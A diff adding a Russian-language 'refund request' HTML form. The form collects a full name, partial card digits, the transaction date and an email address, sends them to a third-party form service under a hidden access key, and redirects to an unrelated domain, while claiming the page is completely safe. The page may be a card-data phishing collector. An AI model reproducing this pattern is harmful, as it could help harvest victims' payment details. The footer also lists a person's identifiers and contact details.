@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width">
+    <title>Возврат средств</title>
+   <style>        
+        html, body {
+           display: flex;
+      justify-content: center;
+        width: 100%; 
+      background-color: #ffffff;
+        justify-content: center;
+      font-family: Roboto, Arial, sans-serif;
+      font-size: 14px;
+      }
+     img {
+  width: 400px,
+  height: auto
+}
+
+      form {
+        background-color: #ffffff;
+        width: 700px;
+      border: 0px solid #f1f1f1;
+      }
+      input[type=text], input[type=password] {
+      width: 100%;
+      padding: 15px 5;
+      margin: 9px 0;
+      display: inline-block;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      font-size: 14px;
+      }
+      button {
+        justify-content: center;
+      background-color: green;
+      color: white;
+      padding: 15px 0;
+      margin: 13px 0;
+      border: none;
+      cursor: pointer;
+      width: 300px;
+     font-size: 18px;
+      }
+      h2 {
+      text-align:center;
+      }
+      button:hover {
+      opacity: 0.8;
+      }
+      .formcontainer {
+      text-align: left;
+      margin: 24px 50px 12px;
+      }
+      .container {
+      padding: 16px 0;
+      text-align:left;
+      }
+      span.psw {
+      float: right;
+      padding-top: 0;
+      padding-right: 15px;
+      }
+      /* Change styles for span on extra small screens */
+      @media screen and (max-width: 300px) {
+      span.psw {
+      display: block;
+      float: none;
+      }
+    </style>
+  </head>
+  <body>
+ 
+
+    <form action="https://api.staticforms.xyz/submit" method="post">
+      
+      <div align="center">
+  <br><br>
+<img src="logo.jpg"> </div>
+   <br><br>
+    <h2>Заполните форму для оформления заявки на возврат средств </h2>
+
+    <div class="formcontainer">
+
+    <hr/>
+    <div class="container">
+      
+<input type="hidden" name="accessKey" value="4a210b92-25ba-4cfd-86cc-1f5153b80aa1">
+      <input type="hidden" name="subject" value="Refund" />
+        <input type="hidden" name="replyTo" value="@">
+            <label for="uname">ФИО:</label>
+    <input type="text" maxlength="16" placeholder="Укажите полностью ваше ФИО" name="name" required>
+    <label for="uname">Номер карты:</label>
+    <input type="text" maxlength="16" placeholder="Первые 6 цифр карты" name="$6number" required>
+    <input type="text" maxlength="16" placeholder="Последние 4 цифры карты" name="$4number" required>
+    <label for="uname">Дата транзакции:</label>
+    <input type="text" maxlength="16" placeholder="ДД/ММ/ГГ" name="$date" required>
+    <label for="uname">Электронная почта:</label>
+    <input type="text" placeholder="Ваш Email" name="email" required>
+     <label for="uname">Причина возврата:</label><br>
+    <input type="text"  placeholder="Опишите подробно причину возврата средств" name="$reason" required>
+      <input type="hidden" name="redirectTo" value="https://wb3.guru">
+    </div>
+    <button type="submit">Отправить заявку</button>
+    </form>
+       <div class="container" > Все данные передаются по зашифрованному каналу с использованием протокола TLS. Использование данной страницы абсолютно безопасно  
+<br><br>
+Если возникли вопросы – kbsmaxim@gmail.com
+       </div>
+      <br><br>
+        <div >
+<hr/>
+        <ul class="footer__link-list">
+          <li class="footer__item">ИП Кучмистый М.С.</li>
+          <li class="footer__item">ИНН: 280445074123</li>
+          <li class="footer__item">ОГРНИП: 322237500221174</li>
+          <li class="footer__item">+7 495 147 99 90</a></li>
+    <li class="footer__item">kbsmaxim@gmail.com</li></ul></div>
+
+  </body>
+</html>
